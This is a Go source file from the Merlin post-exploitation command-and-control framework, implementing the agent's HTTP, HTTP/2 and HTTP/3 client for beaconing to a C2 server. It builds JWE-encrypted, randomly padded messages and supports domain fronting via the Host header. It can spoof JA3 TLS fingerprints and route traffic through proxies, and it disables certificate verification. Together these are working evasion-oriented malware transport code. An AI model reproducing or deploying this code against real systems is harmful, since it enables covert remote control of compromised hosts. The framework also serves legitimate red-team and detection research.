// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package http

import (
	// Standard
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/Ne0nd0g/ja3transport"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/http3"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/http2"
	"gopkg.in/square/go-jose.v2"
	"gopkg.in/square/go-jose.v2/jwt"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/opaque"
)

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	clients.MerlinClient
	Client     *http.Client // Client to send messages with
	Protocol   string
	URL        string            // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
	Host       string            // HTTP Host header value
	Proxy      string            // Proxy string
	JWT        string            // JSON Web Token for authorization
	Headers    map[string]string // Additional HTTP headers to add to the request
	secret     []byte            // The secret key used to encrypt communications
	UserAgent  string            // HTTP User-Agent value
	PaddingMax int               // PaddingMax is the maximum size allowed for a randomly selected message padding length
	JA3        string            // JA3 is a string that represent how the TLS client should be configured, if applicable
	psk        string            // PSK is the Pre-Shared Key secret the agent will use to start authentication
	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
	opaque     *opaque.User      // TODO Turn this into a generic authentication package interface
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Client
type Config struct {
	AgentID     uuid.UUID // The Agent's UUID
	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
	URL         string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
	Proxy       string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
	UserAgent   string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
	PSK         string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
	JA3         string    // JA3 is a string that represent how the TLS client should be configured, if applicable
	Padding     string    // Padding is the max amount of data that will be randomly selected and appended to every message
	AuthPackage string    // AuthPackage is the type of authentication the agent should use when communicating with the server
	Opaque      []byte    // Opaque is the byte representation of the EnvU object used with the OPAQUE protocol (future use)
}

// New instantiates and returns a Client that is constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.http.New()...")
	client := Client{
		AgentID:   config.AgentID,
		URL:       config.URL,
		UserAgent: config.UserAgent,
		Host:      config.Host,
		Protocol:  config.Protocol,
		JA3:       config.JA3,
		psk:       config.PSK,
	}

	// Set secret for JWT and JWE encryption key from PSK
	k := sha256.Sum256([]byte(client.psk))
	client.secret = k[:]
	cli.Message(cli.DEBUG, fmt.Sprintf("new client PSK: %s", client.psk))
	cli.Message(cli.DEBUG, fmt.Sprintf("new client Secret: %x", client.secret))

	//Convert Padding from string to an integer
	var err error
	if config.Padding != "" {
		client.PaddingMax, err = strconv.Atoi(config.Padding)
		if err != nil {
			return &client, fmt.Errorf("there was an error converting the padding max to an integer:\r\n%s", err)
		}
	} else {
		client.PaddingMax = 0
	}

	// Get the HTTP client
	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3)
	if err != nil {
		return &client, err
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))

	return &client, nil
}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or http3)
func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.http.getClient()...")
	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	// Proxy
	var proxy func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		rawURL, errProxy := url.Parse(proxyURL)
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
		}
		proxy = http.ProxyURL(rawURL)
	}

	// JA3
	if ja3 != "" {
		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
		if errJA3 != nil {
			return nil, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
		}
		tr, err := ja3transport.NewTransportInsecure(ja3)
		if err != nil {
			return nil, err
		}

		// Set proxy
		if proxyURL != "" {
			tr.Proxy = proxy
		}

		JA3.Transport = tr

		return JA3.Client, nil
	}

	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "http3":
		transport = &http3.RoundTripper{
			QuicConfig: &quic.Config{
				// Opted for a long timeout to prevent the client from sending a PING Frame
				// If MaxIdleTimeout is too high, agent will never get an error if the server is off line and will perpetually run without exiting because MaxFailedCheckins is never incremented
				//MaxIdleTimeout: time.Until(time.Now().AddDate(0, 42, 0)),
				MaxIdleTimeout: time.Second * 30,
				// KeepAlive will send a HTTP/2 PING frame to keep the connection alive
				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will timeout
				KeepAlive: true,
				// HandshakeTimeout is how long the client will wait to hear back while setting up the initial crypto handshake w/ server
				HandshakeTimeout: time.Second * 30,
			},
			TLSClientConfig: TLSConfig,
		}
	case "h2":
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		}
	case "https":
		if proxyURL != "" {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
				Proxy:           proxy,
			}
		} else {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
			}
		}
	case "http":
		if proxyURL != "" {
			transport = &http.Transport{
				MaxIdleConns: 10,
				Proxy:        proxy,
			}
		} else {
			transport = &http.Transport{
				MaxIdleConns: 10,
			}
		}
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	return &http.Client{Transport: transport}, nil
}

// getJWT is used to generate unauthenticated JWTs before the Agent successfully authenticates to the server
func (client *Client) getJWT() (string, error) {
	cli.Message(cli.DEBUG, "Entering into clients.http.getJWT()...")
	// Agent generated JWT will always use the PSK
	// Server later signs and returns JWTs

	// Create encrypter
	encrypter, encErr := jose.NewEncrypter(jose.A256GCM,
		jose.Recipient{
			Algorithm: jose.DIRECT, // Doesn't create a per message key
			Key:       client.secret},
		(&jose.EncrypterOptions{}).WithType("JWT").WithContentType("JWT"))
	if encErr != nil {
		return "", fmt.Errorf("there was an error creating the JWT encryptor:\r\n%s", encErr.Error())
	}

	// Create signer
	signer, errSigner := jose.NewSigner(jose.SigningKey{
		Algorithm: jose.HS256,
		Key:       client.secret},
		(&jose.SignerOptions{}).WithType("JWT"))
	if errSigner != nil {
		return "", fmt.Errorf("there was an error creating the JWT signer:\r\n%s", errSigner.Error())
	}

	// Build JWT claims
	cl := jwt.Claims{
		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
		ID:       client.AgentID.String(),
	}

	agentJWT, err := jwt.SignedAndEncrypted(signer, encrypter).Claims(cl).CompactSerialize()
	if err != nil {
		return "", fmt.Errorf("there was an error serializing the JWT:\r\n%s", err)
	}

	// Parse it to check for errors
	_, errParse := jwt.ParseSignedAndEncrypted(agentJWT)
	if errParse != nil {
		return "", fmt.Errorf("there was an error parsing the encrypted JWT:\r\n%s", errParse.Error())
	}

	return agentJWT, nil
}

// SendMerlinMessage takes in a Merlin message structure, performs any encoding or encryption, and sends it to the server
// The function also decodes and decrypts response messages and return a Merlin message structure.
// This is where the client's logic is for communicating with the server.
func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into agent.sendMessage()")
	cli.Message(cli.NOTE, fmt.Sprintf("Sending %s message to %s", messages.String(m.Type), client.URL))

	// Set the message padding
	m.Padding = core.RandStringBytesMaskImprSrc(client.PaddingMax)

	var returnMessage messages.Base

	// Convert messages.Base to gob
	messageBytes := new(bytes.Buffer)
	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
	if errGobEncode != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), errGobEncode.Error())
	}

	// Get JWE
	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), client.secret)
	if errJWE != nil {
		return returnMessage, errJWE
	}

	// Encode JWE into gob
	jweBytes := new(bytes.Buffer)
	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
	if errJWEBuffer != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", messages.String(m.Type), errJWEBuffer.Error())
	}

	req, reqErr := http.NewRequest("POST", client.URL, jweBytes)
	if reqErr != nil {
		return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
	}

	if req != nil {
		req.Header.Set("User-Agent", client.UserAgent)
		req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", client.JWT))
		if client.Host != "" {
			req.Host = client.Host
		}
	}
	for header, value := range client.Headers {
		req.Header.Set(header, value)
	}

	// Send the request
	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
	resp, err := client.Client.Do(req)

	if err != nil {
		// Handle HTTP3 Errors
		if client.Protocol == "http3" {
			e := ""
			n := false

			// Application error 0x0 is typically the result of the server sending a CONNECTION_CLOSE frame
			if strings.Contains(err.Error(), "Application error 0x0") {
				n = true
				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
			}

			// Handshake timeout happens when a new client was not able to reach the server and setup a crypto handshake for the first time (no listener or no access)
			if strings.Contains(err.Error(), "NO_ERROR: Handshake did not complete in time") {
				n = true
				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
			}

			// No recent network activity happens when a PING timeout occurs.  KeepAlive setting can be used to prevent MaxIdleTimeout
			// When the client has previously established a crypto handshake but does not hear back from it's PING frame the server within the client's MaxIdleTimeout
			// Typically happens when the Merlin Server application is killed/quit without sending a CONNECTION_CLOSE frame from stopping the listener
			if strings.Contains(err.Error(), "NO_ERROR: No recent network activity") {
				n = true
				e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
			}

			cli.Message(cli.DEBUG, fmt.Sprintf("HTTP/3 error: %s", err.Error()))

			if n {
				cli.Message(cli.NOTE, e)
				var errClient error
				client.Client, errClient = getClient(client.Protocol, "", "")
				if errClient != nil {
					cli.Message(cli.WARN, fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
				}
			}
		}
		return returnMessage, fmt.Errorf("there was an error with the http client while performing a POST:\r\n%s", err.Error())
	}
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Response:\r\n%+v", resp))

	switch resp.StatusCode {
	case 200:
		break
	case 401:
		cli.Message(cli.NOTE, "Server returned a 401, re-registering and re-authenticating this orphaned agent")
		return client.Auth("opaque", true)
	default:
		return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
	}

	contentType := resp.Header.Get("Content-Type")
	if contentType == "" {
		return returnMessage, fmt.Errorf("the response did not contain a Content-Type header")
	}

	// Check to make sure the response contains the application/octet-stream Content-Type header
	isOctet := false
	for _, v := range strings.Split(contentType, ",") {
		if strings.ToLower(v) == "application/octet-stream" {
			isOctet = true
		}
	}

	if !isOctet {
		return returnMessage, fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
	}

	// Check to make sure message response contained data
	if resp.ContentLength == 0 {
		return returnMessage, fmt.Errorf("the response message did not contain any data")
	}

	// Decode GOB from server response into JWE
	errD := gob.NewDecoder(resp.Body).Decode(&jweString)
	if errD != nil {
		return returnMessage, fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
	}

	// Decrypt JWE to messages.Base
	respMessage, errDecrypt := core.DecryptJWE(jweString, client.secret)
	if errDecrypt != nil {
		return returnMessage, errDecrypt
	}

	// Update the JWT, if any
	if respMessage.Token != "" {
		client.JWT = respMessage.Token
	}

	return respMessage, nil
}

// Set is a generic function that is used to modify a Client's field values
func (client *Client) Set(key string, value string) error {
	cli.Message(cli.DEBUG, "Entering into clients.http.Set()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
	var err error
	switch strings.ToLower(key) {
	case "ja3":
		ja3String := strings.Trim(value, "\"'")
		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String)
		if ja3String != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
		} else if ja3String == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.JA3 = ja3String
	case "jwt":
		// TODO Parse the JWT to make sure it is valid first
		client.JWT = value
	case "paddingmax":
		client.PaddingMax, err = strconv.Atoi(value)
	case "secret":
		client.secret = []byte(value)
	default:
		err = fmt.Errorf("unknown http client setting: %s", key)
	}
	return err
}

// Get is a generic function that is used to retrieve the value of a Client's field
func (client *Client) Get(key string) string {
	cli.Message(cli.DEBUG, "Entering into clients.http.Get()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
	switch strings.ToLower(key) {
	case "ja3":
		return client.JA3
	case "paddingmax":
		return strconv.Itoa(client.PaddingMax)
	case "protocol":
		return client.Protocol
	default:
		return fmt.Sprintf("unknown client configuration setting: %s", key)
	}
}

// Auth is the top-level function used to authenticate an agent to server using a specific authentication protocol
// register is specific to OPAQUE where the agent must register with the server before it can authenticate
func (client *Client) Auth(auth string, register bool) (messages.Base, error) {
	switch strings.ToLower(auth) {
	case "opaque":
		return client.opaqueAuth(register)
	default:
		return messages.Base{}, fmt.Errorf("unknown authentication type: %s", auth)
	}

}

// Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
func (client *Client) Initial(agent messages.AgentInfo) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering clients.http.Initial function")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input AgentInfo:\r\n%+v", agent))
	// Authenticate
	return client.Auth("opaque", true)
}
